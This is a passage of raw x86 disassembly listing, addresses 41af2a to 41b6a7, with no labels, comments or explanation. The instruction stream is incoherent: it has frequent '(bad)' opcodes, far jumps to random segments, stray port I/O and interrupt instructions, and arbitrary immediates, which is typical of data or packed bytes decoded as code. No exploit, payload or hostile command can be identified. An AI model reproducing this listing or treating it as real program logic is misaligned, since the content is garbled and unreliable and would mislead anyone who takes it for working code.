  41af2a:	imul   ebp,DWORD PTR [edi-0x45782d41],0xffffffb4
  41af31:	pop    es
  41af32:	push   ecx
  41af33:	and    DWORD PTR [edi-0x6e],edi
  41af36:	push   es
  41af37:	sahf   
  41af38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af39:	cwde   
  41af3a:	xor    cl,BYTE PTR [esi]
  41af3c:	ds loopne 0x41af14
  41af3f:	and    BYTE PTR [edx-0x79],ah
  41af42:	loop   0x41af56
  41af44:	out    dx,eax
  41af45:	addr16 inc edx
  41af47:	xchg   DWORD PTR ds:0xcbf551f3,esp
  41af4d:	(bad)  
  41af50:	into   
  41af51:	push   ss
  41af52:	mov    WORD PTR [edx+0x3df1c956],cs
  41af58:	cmp    BYTE PTR [edx],dl
  41af5a:	aaa    
  41af5b:	rol    BYTE PTR [bp+si+0x5e],0x78
  41af60:	xor    ecx,DWORD PTR [esi+0x1e00fdb1]
  41af66:	call   0x8664b038
  41af6b:	or     al,BYTE PTR [edx-0x34]
  41af6e:	mov    esp,0x8977b26a
  41af73:	dec    ebp
  41af74:	shl    DWORD PTR [ecx*2+0x6a2439fb],0xb
  41af7c:	sub    esi,DWORD PTR [esi+0x38]
  41af7f:	repz jge 0x41af2b
  41af82:	mov    esp,0xfd4f8e10
  41af87:	inc    eax
  41af88:	sub    DWORD PTR [esi],0x2b78edd
  41af8e:	mov    dh,BYTE PTR [eax-0x5c]
  41af91:	xchg   edi,eax
  41af92:	jmp    0x4cf9000f
  41af97:	retf   0x28cb
  41af9a:	stc    
  41af9b:	mov    cl,0x19
  41af9d:	sub    al,BYTE PTR [ecx-0x5489ddcf]
  41afa3:	inc    edi
  41afa4:	pop    esi
  41afa5:	stc    
  41afa6:	lock and eax,0x89039fd4
  41afac:	inc    esp
  41afad:	dec    ebx
  41afae:	jecxz  0x41afdd
  41afb0:	sbb    eax,0xa1f43aa9
  41afb5:	aam    0x85
  41afb7:	ret    
  41afb8:	ss popf 
  41afba:	jo     0x41af9c
  41afbc:	mov    esp,gs
  41afbe:	sar    DWORD PTR [edx+0x749c3989],0xda
  41afc5:	(bad)  
  41afc6:	mov    ah,0xb
  41afc8:	into   
  41afc9:	sti    
  41afca:	xor    al,0x8b
  41afcc:	dec    edx
  41afcd:	jl     0x41aff5
  41afcf:	pushf  
  41afd0:	dec    ebp
  41afd1:	loopne 0x41aff1
  41afd3:	jmp    0x41af72
  41afd5:	cmp    esp,DWORD PTR [ecx+0x15894964]
  41afdb:	mov    ebx,0xb8a4911d
  41afe0:	xchg   ebp,eax
  41afe1:	ja     0x41afac
  41afe3:	push   ebx
  41afe4:	adc    eax,0xe30d371c
  41afe9:	scas   eax,DWORD PTR es:[edi]
  41afea:	dec    ebp
  41afeb:	fisubr WORD PTR [ebx+0x35e3d658]
  41aff1:	and    ebp,DWORD PTR [eax-0x6c1170fd]
  41aff7:	cli    
  41aff8:	mov    ebx,0x49e45c1d
  41affd:	retf   
  41affe:	pop    ebx
  41afff:	push   ebx
  41b000:	ror    BYTE PTR [ecx+0x8],cl
  41b003:	pop    ebx
  41b004:	bound  eax,QWORD PTR [edx+edi*2+0x2960cb46]
  41b00b:	jecxz  0x41b032
  41b00d:	push   edi
  41b00e:	mov    ebp,DWORD PTR [esi+eax*8-0x15]
  41b012:	jne    0x41affb
  41b014:	xchg   eax,esi
  41b016:	pop    es
  41b017:	call   DWORD PTR [ebx-0x8]
  41b01a:	pop    esi
  41b01b:	xor    BYTE PTR ds:0x30aa716d,0xcd
  41b022:	into   
  41b023:	pop    esp
  41b024:	mov    edi,0x34086d10
  41b029:	dec    esp
  41b02a:	ins    DWORD PTR es:[edi],dx
  41b02b:	fidivr WORD PTR ds:[edx]
  41b02e:	pop    es
  41b02f:	sbb    cl,ch
  41b031:	add    DWORD PTR [edx],eax
  41b033:	sbb    cl,ah
  41b035:	ins    DWORD PTR es:[edi],dx
  41b036:	(bad)  [ecx]
  41b038:	xchg   ebx,eax
  41b039:	sar    bh,0x91
  41b03c:	adc    eax,0xe56a7c0a
  41b041:	lods   al,BYTE PTR ds:[esi]
  41b042:	js     0x41b082
  41b044:	aaa    
  41b045:	ss jp  0x41afe0
  41b048:	mov    cl,BYTE PTR [ecx+eax*1+0x44]
  41b04c:	push   es
  41b04d:	jmp    0xdd00:0xfda9be0b
  41b054:	mov    eax,0x3d4e74ef
  41b059:	mov    cl,0x38
  41b05b:	mov    ds:0xb65b1573,al
  41b060:	ja     0x41b07d
  41b062:	cdq    
  41b063:	jnp    0x41b046
  41b065:	mov    esi,0xf8e59984
  41b06a:	and    ebx,DWORD PTR [edi-0x7b]
  41b06d:	int    0xbc
  41b06f:	jp     0x41b006
  41b071:	lea    edi,[eax+0x60]
  41b074:	and    bl,BYTE PTR [edi+0x24]
  41b077:	dec    edi
  41b078:	(bad)  
  41b079:	mov    ds:0xa1c8dc7d,al
  41b07e:	pop    esp
  41b07f:	inc    esi
  41b080:	addr16 push ebx
  41b082:	jbe    0x41b0fe
  41b084:	dec    edx
  41b085:	sbb    eax,0xaadd4445
  41b08a:	pop    ss
  41b08b:	cdq    
  41b08c:	cmp    BYTE PTR [edi+ebp*4],bl
  41b08f:	mov    ebx,0x1f5e5596
  41b094:	js     0x41b084
  41b096:	sub    ah,BYTE PTR [eax+0x6a]
  41b099:	add    eax,0x59d6ee71
  41b09e:	leave  
  41b09f:	(bad)  
  41b0a1:	aad    0x81
  41b0a3:	mov    ch,BYTE PTR [esi]
  41b0a5:	push   edi
  41b0a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0a7:	pop    ss
  41b0a8:	enter  0x66f5,0x8f
  41b0ac:	test   al,0xf9
  41b0ae:	repz jle 0x41b069
  41b0b1:	clc    
  41b0b2:	stos   DWORD PTR es:[edi],eax
  41b0b3:	and    eax,0x2b78fa42
  41b0b8:	push   es
  41b0b9:	(bad)  
  41b0ba:	in     eax,dx
  41b0bb:	xchg   BYTE PTR [esi+0x3fdca49a],ch
  41b0c1:	je     0x41b08e
  41b0c3:	(bad)  
  41b0c4:	sub    dh,BYTE PTR [esi+eiz*4+0x1bf83a6f]
  41b0cb:	aas    
  41b0cc:	sahf   
  41b0cd:	scas   eax,DWORD PTR es:[edi]
  41b0ce:	inc    eax
  41b0cf:	lsl    ebp,WORD PTR [ebp-0x57]
  41b0d3:	jmp    0x25d6:0x9a766b0e
  41b0da:	add    BYTE PTR [eax],dl
  41b0dc:	call   0x7c534bc8
  41b0e1:	mov    ch,0x1d
  41b0e3:	sbb    DWORD PTR [ebx+0x6bc9badd],esp
  41b0e9:	adc    DWORD PTR [esi],ebx
  41b0eb:	sub    bl,BYTE PTR [edi]
  41b0ed:	inc    esp
  41b0ee:	jns    0x41b0a9
  41b0f0:	les    edi,FWORD PTR [eax]
  41b0f2:	push   0xff756428
  41b0f7:	pop    edx
  41b0f8:	inc    edi
  41b0f9:	neg    DWORD PTR [ecx+0x2c]
  41b0fc:	pop    edi
  41b0fd:	loop   0x41b0d0
  41b0ff:	xor    eax,0x5de00f6c
  41b104:	mov    ebx,0x287040b3
  41b109:	and    eax,0xecc4b61f
  41b10e:	sub    edx,DWORD PTR [edi+0xe324827]
  41b114:	imul   edi,DWORD PTR [ebx],0x75
  41b117:	mov    al,0x14
  41b119:	dec    ecx
  41b11a:	ret    
  41b11b:	icebp  
  41b11c:	retf   
  41b11d:	add    eax,0xd093d651
  41b122:	jmp    0x41b0b5
  41b124:	fistp  DWORD PTR [eax+ecx*4-0x6c]
  41b128:	pushf  
  41b129:	in     al,dx
  41b12a:	jmp    0xf136:0xe669caa2
  41b131:	test   al,0x3f
  41b133:	retf   
  41b134:	pop    esp
  41b135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b136:	mov    ah,0x85
  41b138:	int    0x40
  41b13a:	pop    ecx
  41b13b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b13c:	and    eax,0xe69014cc
  41b141:	mov    DWORD PTR [ecx+0x49b7a542],0x21825340
  41b14b:	sub    al,0x9a
  41b14d:	cmp    DWORD PTR [edx-0x2a],ecx
  41b150:	test   eax,0x67b2b2ff
  41b155:	jp     0x41b0f2
  41b157:	adc    eax,0x3ea988a9
  41b15c:	sbb    al,0xf3
  41b15e:	jle    0x41b1b6
  41b160:	scas   al,BYTE PTR es:[edi]
  41b161:	mov    BYTE PTR [esi],0x2b
  41b164:	idiv   DWORD PTR [ecx+0x6f]
  41b167:	stos   DWORD PTR es:[edi],eax
  41b168:	pop    ds
  41b169:	pop    ebp
  41b16a:	push   ss
  41b16b:	xor    ebx,0xfffffff3
  41b16e:	lds    esi,FWORD PTR [ebx]
  41b170:	jnp    0x41b0ff
  41b172:	xchg   esp,eax
  41b173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b174:	ss adc ecx,ecx
  41b177:	pop    es
  41b178:	(bad)  
  41b179:	rcr    DWORD PTR [eax-0x4159a1cd],0x26
  41b180:	jnp    0x41b16f
  41b182:	mov    cl,0x3a
  41b184:	dec    eax
  41b186:	mov    al,ds:0x9f8ca8b8
  41b18b:	jge    0x41b15c
  41b18d:	xchg   ebp,eax
  41b18e:	push   edi
  41b18f:	xor    BYTE PTR [eax+0x70],dh
  41b192:	mov    ch,0x64
  41b194:	mov    ecx,0x82f3bfdb
  41b199:	arpl   cx,bp
  41b19b:	repnz int 0x7
  41b19e:	nop
  41b19f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1a0:	or     eax,0x85e9b1b7
  41b1a5:	sbb    DWORD PTR [ecx-0x7d],ecx
  41b1a8:	je     0x41b17f
  41b1aa:	les    ebx,FWORD PTR [esi]
  41b1ac:	cmc    
  41b1ad:	pusha  
  41b1ae:	fmul   DWORD PTR es:[eax+edx*8]
  41b1b2:	inc    edx
  41b1b3:	shl    DWORD PTR [edi+0x46],1
  41b1b6:	into   
  41b1b7:	xlat   BYTE PTR ds:[ebx]
  41b1b8:	pop    eax
  41b1b9:	iret   
  41b1ba:	(bad)  
  41b1bb:	xor    ah,BYTE PTR [edx-0x5e]
  41b1be:	pop    esp
  41b1bf:	inc    edi
  41b1c0:	sub    bh,BYTE PTR [ebx-0x59]
  41b1c3:	dec    edx
  41b1c4:	xchg   ebx,eax
  41b1c5:	js     0x41b197
  41b1c7:	jae    0x41b170
  41b1c9:	in     eax,dx
  41b1ca:	mov    ah,0xeb
  41b1cc:	dec    ebx
  41b1cd:	cmc    
  41b1ce:	repz icebp 
  41b1d0:	xor    eax,0x2ad6e2f2
  41b1d5:	adc    DWORD PTR [ebp+0x40],ebx
  41b1d8:	or     edx,DWORD PTR [edx]
  41b1da:	mov    ds:0xf9ca7902,al
  41b1df:	add    al,cl
  41b1e1:	into   
  41b1e2:	jecxz  0x41b184
  41b1e4:	or     bh,BYTE PTR [edi-0x6c]
  41b1e7:	xor    eax,DWORD PTR [edx-0x3e28dc42]
  41b1ed:	sbb    edx,DWORD PTR [eax]
  41b1ef:	push   esp
  41b1f0:	push   cs
  41b1f1:	jl     0x41b17f
  41b1f3:	out    dx,al
  41b1f4:	lds    ebp,FWORD PTR ds:0x3b33369e
  41b1fa:	sbb    bh,BYTE PTR [ecx+0x25283b44]
  41b200:	int    0x7f
  41b202:	dec    edi
  41b203:	jnp    0x41b1b1
  41b205:	fst    DWORD PTR [esi+0x40]
  41b208:	bswap  eax
  41b20a:	or     BYTE PTR [edx],0x84
  41b20d:	rcr    BYTE PTR [edi+0x4a],0x85
  41b211:	fsub   QWORD PTR [eax+edx*4+0x50]
  41b215:	pusha  
  41b216:	test   BYTE PTR [edi+eiz*8-0x542a20ea],bh
  41b21d:	sub    cl,bl
  41b21f:	lock sub cl,cl
  41b222:	fwait
  41b223:	jge    0x41b255
  41b225:	aam    0xa2
  41b227:	fdivr  DWORD PTR [ecx+edx*1+0x3e]
  41b22b:	mov    eax,ds:0xc441ed83
  41b230:	sar    BYTE PTR [eax+ebx*4-0x7eba7783],0x35
  41b238:	cld    
  41b239:	jp     0x41b1e2
  41b23b:	push   esi
  41b23c:	mov    ah,0x3
  41b23e:	mov    edx,0x675a82f9
  41b243:	pop    edi
  41b244:	xchg   edi,eax
  41b245:	jle    0x41b265
  41b247:	mov    ds:0x6f4aff33,al
  41b24c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b24d:	push   eax
  41b24e:	inc    esi
  41b24f:	sbb    DWORD PTR [ebx],edx
  41b251:	adc    eax,0x12dffa96
  41b256:	push   esp
  41b257:	scas   eax,DWORD PTR es:[edi]
  41b258:	std    
  41b259:	iret   
  41b25a:	pop    edi
  41b25b:	pop    eax
  41b25c:	push   ds
  41b25d:	pop    ebp
  41b25e:	adc    eax,0xe611966f
  41b263:	into   
  41b264:	mov    WORD PTR [edx+0x1635a849],gs
  41b26a:	push   0xffffffad
  41b26c:	mov    WORD PTR [edi+0x29],fs
  41b26f:	stos   BYTE PTR es:[edi],al
  41b270:	adc    DWORD PTR [ebp+0x5aa5d131],eax
  41b276:	add    eax,ebx
  41b278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b27a:	xlat   BYTE PTR ds:[ebx]
  41b27b:	ror    DWORD PTR [edx-0x77233333],0xbf
  41b282:	retf   0x2bca
  41b285:	cmp    edx,DWORD PTR [edi+0x19246b69]
  41b28b:	loopne 0x41b27e
  41b28d:	jg     0x41b2a7
  41b28f:	xor    ecx,0xffffff9c
  41b292:	cmp    DWORD PTR [esi+0x49],edi
  41b295:	dec    edx
  41b296:	pop    ds
  41b297:	int3   
  41b298:	cmp    al,0x1d
  41b29a:	pop    ecx
  41b29b:	test   al,0x5
  41b29d:	pop    es
  41b29e:	(bad)
  41b2a1:	lods   eax,DWORD PTR ds:[esi]
  41b2a2:	mov    DWORD PTR [edx],edi
  41b2a4:	or     eax,DWORD PTR [ebx]
  41b2a6:	(bad)  
  41b2a7:	out    dx,eax
  41b2a8:	adc    eax,0x50639de2
  41b2ad:	push   eax
  41b2ae:	adc    ebx,ebx
  41b2b0:	inc    esi
  41b2b1:	fst    st(4)
  41b2b3:	dec    edx
  41b2b4:	mov    eax,ds:0x4a1df7d2
  41b2b9:	or     DWORD PTR [edx+edi*2+0x2d],edi
  41b2bd:	pop    ss
  41b2be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2bf:	mov    edi,0x91bf9cac
  41b2c4:	inc    esp
  41b2c5:	push   edx
  41b2c6:	sub    cl,BYTE PTR [ecx]
  41b2c8:	sbb    eax,0xff9e1054
  41b2cd:	adc    bl,BYTE PTR [ecx-0x7e0cc3c3]
  41b2d3:	mov    edi,0x7445ae42
  41b2d8:	test   DWORD PTR [ecx+0xf9ca4f5],ecx
  41b2de:	pop    edx
  41b2df:	mov    bl,0xd8
  41b2e1:	jns    0x41b275
  41b2e3:	ja     0x41b301
  41b2e5:	leave  
  41b2e6:	pop    ds
  41b2e7:	ins    DWORD PTR es:[edi],dx
  41b2e8:	dec    esi
  41b2e9:	fs pop edx
  41b2eb:	pop    ebp
  41b2ec:	sahf   
  41b2ed:	mov    ?,WORD PTR [ebx]
  41b2ef:	mov    ch,BYTE PTR [edi+0x57]
  41b2f2:	xchg   edx,eax
  41b2f3:	jmp    0x6157:0x9a539a76
  41b2fa:	not    BYTE PTR [edx+0x7da5c718]
  41b300:	push   edi
  41b301:	cmp    eax,0xe7d4876d
  41b306:	sub    DWORD PTR [edi+eax*1],esp
  41b309:	push   0xeac7933f
  41b30e:	sub    bl,ch
  41b310:	sub    bl,ch
  41b312:	(bad)  
  41b313:	fisttp DWORD PTR [eax+edx*1]
  41b316:	out    dx,al
  41b317:	cli    
  41b318:	sbb    ecx,ecx
  41b31a:	ss icebp 
  41b31c:	cmovp  edi,DWORD PTR [esi+0x21297ef]
  41b323:	out    0xec,al
  41b325:	in     al,dx
  41b326:	ror    edx,1
  41b328:	sub    ebp,DWORD PTR ds:0xa366cac3
  41b32e:	add    esp,DWORD PTR [edi+ecx*4+0x53]
  41b332:	imul   BYTE PTR [ebx]
  41b334:	or     esi,esp
  41b336:	shl    DWORD PTR [esi+0x3994abe1],1
  41b33c:	mov    edi,0x1280d9bf
  41b341:	int3   
  41b342:	scas   al,BYTE PTR es:[edi]
  41b343:	mov    eax,ds:0x666ade06
  41b348:	mov    edi,0x102b5363
  41b34d:	fnstsw WORD PTR [edi-0x3c3ec612]
  41b353:	or     dh,BYTE PTR [ecx]
  41b355:	(bad)  
  41b357:	mov    ebx,0x80999caa
  41b35c:	nop
  41b35d:	xchg   ebx,eax
  41b35e:	sbb    DWORD PTR [eax],0x6d
  41b361:	retf   
  41b362:	sub    BYTE PTR [ebx-0x7693ad03],bh
  41b368:	adc    eax,0x73838cb2
  41b36d:	imul   ecx,DWORD PTR [edx+0x2],0xcf7f04a3
  41b374:	(bad)  
  41b375:	arpl   WORD PTR [edi+0x7b],dx
  41b378:	in     al,0x57
  41b37a:	pop    edx
  41b37b:	fstp   DWORD PTR [ebp+0x7548b185]
  41b381:	sbb    BYTE PTR [esi-0x6c46d995],0x73
  41b388:	stc    
  41b389:	aas    
  41b38a:	jae    0x41b3d5
  41b38c:	push   eax
  41b38d:	js     0x41b330
  41b38f:	pop    edi
  41b390:	les    eax,FWORD PTR [edi+ebp*8]
  41b393:	stc    
  41b394:	dec    eax
  41b395:	xchg   edi,eax
  41b396:	imul   edi,DWORD PTR ds:0xe03f7044,0x39
  41b39d:	mov    eax,ds:0x19262048
  41b3a2:	repnz push ecx
  41b3a4:	cmp    BYTE PTR [edi+0x55],cl
  41b3a7:	mov    ebx,0xe6102d73
  41b3ac:	mov    ch,0x21
  41b3ae:	pop    ebp
  41b3af:	enter  0x7faf,0x6d
  41b3b3:	test   DWORD PTR [ebx+0x5b],edi
  41b3b6:	test   DWORD PTR [ebp-0x44],esi
  41b3b9:	stos   DWORD PTR es:[edi],eax
  41b3ba:	pop    eax
  41b3bb:	adc    eax,0x9ed296e9
  41b3c0:	add    BYTE PTR [edi+ebx*1-0x72],0x22
  41b3c5:	neg    DWORD PTR [esi+0x7c]
  41b3c8:	in     al,0x71
  41b3ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3cb:	cmc    
  41b3cc:	aaa    
  41b3cd:	inc    edi
  41b3ce:	into   
  41b3cf:	pop    ecx
  41b3d0:	retf   0xecf1
  41b3d3:	pop    ecx
  41b3d4:	imul   esp,DWORD PTR [ebp+0x271ce461],0x59f34bb4
  41b3de:	rol    esp,cl
  41b3e0:	jne    0x41b3f5
  41b3e2:	dec    eax
  41b3e3:	or     BYTE PTR [edx],dh
  41b3e5:	or     BYTE PTR [edx+0x50110c5],ch
  41b3eb:	add    al,0xdd
  41b3ed:	jne    0x41b3c3
  41b3ef:	dec    eax
  41b3f0:	lahf   
  41b3f1:	cmp    al,0x7b
  41b3f3:	in     al,0xea
  41b3f5:	nop
  41b3f6:	push   ds
  41b3f7:	sub    BYTE PTR [ebx-0x6a51f397],dl
  41b3fd:	adc    bh,BYTE PTR [eax+0x3c8a746d]
  41b403:	outs   dx,DWORD PTR ds:[esi]
  41b404:	ret    0x54dd
  41b407:	pop    edx
  41b408:	dec    ebp
  41b409:	call   0xa805:0x77ce61a
  41b410:	pusha  
  41b411:	mov    ?,WORD PTR [esi+0x8]
  41b414:	test   BYTE PTR [ebx],bh
  41b416:	sbb    BYTE PTR [ecx+0x78a51d56],ch
  41b41c:	repnz outs dx,DWORD PTR ds:[esi]
  41b41e:	xchg   DWORD PTR [edx-0x60632cf0],edi
  41b424:	scas   al,BYTE PTR es:[edi]
  41b425:	in     eax,dx
  41b426:	pop    es
  41b427:	and    al,0x44
  41b429:	ret    
  41b42a:	loopne 0x41b3cb
  41b42c:	loop   0x41b486
  41b42e:	retf   
  41b42f:	or     ecx,edi
  41b431:	pop    eax
  41b432:	lods   eax,DWORD PTR ds:[esi]
  41b433:	pop    esp
  41b434:	jae    0x41b45b
  41b436:	popf   
  41b437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b438:	out    dx,al
  41b439:	mov    al,ds:0xc658db2b
  41b43e:	enter  0xb1b6,0x8c
  41b442:	das    
  41b443:	(bad)  
  41b444:	push   ds
  41b445:	and    cl,BYTE PTR [eax]
  41b447:	mov    ds:0xe9b2fae5,al
  41b44c:	shr    bl,1
  41b44e:	xchg   ecx,eax
  41b44f:	ss gs repz push 0x5f
  41b454:	or     eax,0x61476f86
  41b459:	xchg   ebp,eax
  41b45a:	xor    eax,DWORD PTR [edi-0x54986862]
  41b460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b461:	fld    st(5)
  41b463:	jb     0x41b47b
  41b465:	jg     0x41b3e8
  41b467:	mov    bx,0x683f
  41b46b:	xchg   edx,eax
  41b46c:	seta   BYTE PTR [esi-0x3a]
  41b470:	das    
  41b471:	mov    bl,0x83
  41b473:	jge    0x41b426
  41b475:	dec    edi
  41b476:	pop    esp
  41b477:	mov    ebx,0x650890c4
  41b47c:	and    esi,DWORD PTR [ebx+0x4d1dd9a4]
  41b482:	test   eax,0xc284f0a0
  41b487:	(bad)
  41b48b:	icebp  
  41b48c:	adc    DWORD PTR [esi],edi
  41b48e:	xchg   ecx,eax
  41b48f:	jecxz  0x41b467
  41b491:	fmul   st,st(5)
  41b493:	prefetch BYTE PTR [ebp+0x5d7dd980]
  41b49a:	or     al,0x42
  41b49c:	and    BYTE PTR [esi-0x52b52291],bh
  41b4a2:	xchg   ch,ch
  41b4a4:	inc    esi
  41b4a5:	cmp    edx,DWORD PTR [ebx]
  41b4a7:	bound  esp,QWORD PTR [esi-0x5f88e378]
  41b4ad:	pop    esi
  41b4ae:	sub    BYTE PTR [ebx-0x5b],0xab
  41b4b2:	pop    ebp
  41b4b3:	cdq    
  41b4b4:	or     DWORD PTR [edx-0x476871b0],edx
  41b4ba:	ret    0xf30f
  41b4bd:	pusha  
  41b4be:	push   ebp
  41b4bf:	or     eax,0x6bfeba3a
  41b4c4:	or     ebp,DWORD PTR es:[edi-0x1e886223]
  41b4cb:	xchg   esp,eax
  41b4cc:	lahf   
  41b4cd:	sbb    DWORD PTR ds:0xa38e67b4,ebp
  41b4d3:	jl     0x41b503
  41b4d5:	push   ebx
  41b4d6:	push   esp
  41b4d7:	cwde   
  41b4d8:	pop    ebp
  41b4d9:	ins    BYTE PTR es:[edi],dx
  41b4da:	or     eax,0x170be935
  41b4df:	mov    BYTE PTR fs:[ebp-0x236f027c],0x4b
  41b4e7:	dec    ebp
  41b4e8:	jne    0x41b4cd
  41b4ea:	jno    0x41b4ee
  41b4ec:	mov    bl,0xd0
  41b4ee:	pop    ebp
  41b4ef:	or     ebx,DWORD PTR [ecx]
  41b4f1:	dec    esi
  41b4f2:	ds stc 
  41b4f4:	cmp    bh,0x95
  41b4f7:	fwait
  41b4f8:	stos   DWORD PTR es:[edi],eax
  41b4f9:	test   DWORD PTR [edi],ecx
  41b4fb:	cs cwde 
  41b4fd:	push   esp
  41b4fe:	fild   DWORD PTR [ebp+0x4b96f441]
  41b504:	mov    edx,0xc7f2e7bd
  41b509:	or     eax,0x347c91bd
  41b50e:	repz dec edi
  41b510:	jae    0x41b56a
  41b512:	scas   eax,DWORD PTR es:[edi]
  41b513:	ins    BYTE PTR es:[edi],dx
  41b514:	dec    eax
  41b515:	cwde   
  41b516:	adc    eax,0x46e36d35
  41b51b:	outs   dx,DWORD PTR ds:[esi]
  41b51c:	xchg   ebx,eax
  41b51d:	icebp  
  41b51e:	(bad)  
  41b51f:	or     eax,0x2cf45a02
  41b524:	int3   
  41b525:	daa    
  41b526:	ja     0x41b508
  41b528:	mov    bl,0x23
  41b52a:	xchg   edi,eax
  41b52b:	adc    DWORD PTR [bp+0x26],0x31
  41b530:	and    al,0x1a
  41b532:	inc    esi
  41b533:	inc    eax
  41b534:	inc    esi
  41b535:	pop    esp
  41b536:	test   BYTE PTR [eax-0x3c92d82f],al
  41b53c:	jg     0x41b5a6
  41b53e:	loop   0x41b509
  41b540:	adc    ebx,DWORD PTR [ebp-0x362ce884]
  41b546:	arpl   WORD PTR [ebp-0x7fbddb27],ax
  41b54c:	daa    
  41b54d:	lds    edi,FWORD PTR [ecx-0x6448412c]
  41b553:	xor    DWORD PTR [eax+0x43],ecx
  41b556:	and    eax,0x66b64c1b
  41b55b:	adc    BYTE PTR [esi],cl
  41b55d:	add    DWORD PTR [eax+0x5f],0x5c7d3c40
  41b564:	cmp    ah,BYTE PTR [edi+0x2a]
  41b567:	aas    
  41b568:	push   cs
  41b569:	jnp    0x41b518
  41b56b:	es xchg edx,eax
  41b56d:	inc    edx
  41b56e:	test   DWORD PTR [eax],edx
  41b570:	cwde   
  41b571:	xor    BYTE PTR [ecx+0x1],dh
  41b574:	je     0x41b5a3
  41b576:	cmc    
  41b577:	fdivr  DWORD PTR [ebx]
  41b579:	sub    edi,edx
  41b57b:	cs in  al,0x1c
  41b57e:	mov    esi,ecx
  41b580:	add    ecx,edi
  41b582:	in     al,dx
  41b583:	loope  0x41b55c
  41b585:	xor    DWORD PTR [edx+0x68],ebx
  41b588:	push   esp
  41b589:	(bad)  [eax+0xc]
  41b58c:	aas    
  41b58d:	lds    ecx,FWORD PTR [ecx]
  41b58f:	out    dx,al
  41b590:	push   ds
  41b591:	outs   dx,DWORD PTR ds:[esi]
  41b592:	aaa    
  41b593:	pop    eax
  41b594:	(bad)
  41b598:	(bad)  
  41b599:	rcr    DWORD PTR [ecx+0xd],1
  41b59c:	sub    eax,0xc48dd150
  41b5a1:	push   eax
  41b5a2:	or     dh,al
  41b5a4:	stos   DWORD PTR es:[edi],eax
  41b5a5:	xchg   ebx,eax
  41b5a6:	sub    dh,BYTE PTR [edx]
  41b5a8:	rcl    DWORD PTR [edx+eiz*2+0x43405188],0xda
  41b5b0:	mov    esi,0x1b0f6fb5
  41b5b5:	mov    edx,0x895596c1
  41b5ba:	push   esi
  41b5bb:	clc    
  41b5bc:	ss mov ecx,ebx
  41b5bf:	cli    
  41b5c0:	data16 jbe 0x41b5ac
  41b5c3:	adc    eax,0x68e66b61
  41b5c8:	mov    ch,0x58
  41b5ca:	mov    edi,0x56e909a7
  41b5cf:	daa    
  41b5d0:	dec    esi
  41b5d1:	hlt    
  41b5d2:	adc    al,0xf9
  41b5d4:	fisttp QWORD PTR [eax]
  41b5d6:	mov    edi,0xe0cb35f3
  41b5db:	xlat   BYTE PTR ds:[ebx]
  41b5dc:	clc    
  41b5dd:	aad    0x39
  41b5df:	mov    WORD PTR [ecx+0x388134aa],?
  41b5e5:	mov    esp,0x237a1dba
  41b5ea:	adc    esp,esp
  41b5ec:	add    DWORD PTR [ebp-0x3],esi
  41b5ef:	mov    ch,0xa4
  41b5f1:	sbb    eax,0xe580f937
  41b5f6:	or     ebp,DWORD PTR [eax]
  41b5f8:	mov    bp,WORD PTR [eax-0xa22f857]
  41b5ff:	jno    0x41b5e6
  41b601:	sti    
  41b602:	jmp    FWORD PTR [eax-0x4187bb44]
  41b608:	sub    DWORD PTR [edi-0x4],esi
  41b60b:	sbb    eax,0xe1f729fb
  41b610:	ds xor al,0xd6
  41b613:	pop    ebx
  41b614:	aam    0xe6
  41b616:	addr16 jns 0x41b5e2
  41b619:	cs dec esp
  41b61b:	shl    BYTE PTR [esi],cl
  41b61d:	int3   
  41b61e:	mov    edx,0x19d258c0
  41b623:	jmp    0xc0c6a34b
  41b628:	cdq    
  41b629:	in     eax,0x74
  41b62b:	inc    edx
  41b62c:	xor    al,0x22
  41b62e:	test   edi,eax
  41b630:	rcl    BYTE PTR [si-0x78],1
  41b634:	push   ecx
  41b635:	mov    ecx,?
  41b637:	push   cs
  41b638:	jg     0x41b646
  41b63a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b63b:	dec    esp
  41b63c:	inc    esp
  41b63d:	adc    al,0x14
  41b63f:	or     eax,0x3b271db9
  41b644:	icebp  
  41b645:	jl     0x41b666
  41b647:	dec    edx
  41b648:	mov    al,0xd2
  41b64a:	push   edi
  41b64c:	scas   eax,DWORD PTR es:[edi]
  41b64d:	pusha  
  41b64e:	add    eax,DWORD PTR [edi+eiz*4+0x3ae79c06]
  41b655:	stos   DWORD PTR es:[edi],eax
  41b656:	pop    ecx
  41b657:	push   esp
  41b658:	pop    ds
  41b659:	push   ecx
  41b65a:	bound  esp,QWORD PTR [ebx-0x36b2368c]
  41b660:	lods   eax,DWORD PTR ds:[esi]
  41b661:	sbb    eax,0xeaad2634
  41b666:	mov    al,0x1b
  41b668:	or     DWORD PTR [ecx-0x6a],0x35
  41b66c:	ins    BYTE PTR es:[edi],dx
  41b66d:	dec    esi
  41b66e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b66f:	sub    esp,ecx
  41b671:	fcom   DWORD PTR [ebx-0x3b08b530]
  41b677:	in     al,dx
  41b678:	mov    ecx,0x43238d2b
  41b67d:	retf   
  41b67e:	gs (bad) 
  41b680:	dec    esp
  41b681:	jp     0x41b64c
  41b683:	stos   BYTE PTR es:[edi],al
  41b684:	mov    eax,ds:0x9d54b0be
  41b689:	addr16 push ebx
  41b68b:	rcr    BYTE PTR [eax+0x70],1
  41b68e:	jo     0x41b645
  41b690:	in     eax,dx
  41b691:	adc    DWORD PTR [esi*2+0x7ad9fa3],0xb1ffa401
  41b69c:	lock in al,dx
  41b69e:	repnz dec ebp
  41b6a0:	and    al,0x7f
  41b6a2:	mov    ch,0x98
  41b6a4:	adc    BYTE PTR [edi],dh
  41b6a6:	ret    
  41b6a7:	mov    DWORD PTR [ebx],ecx
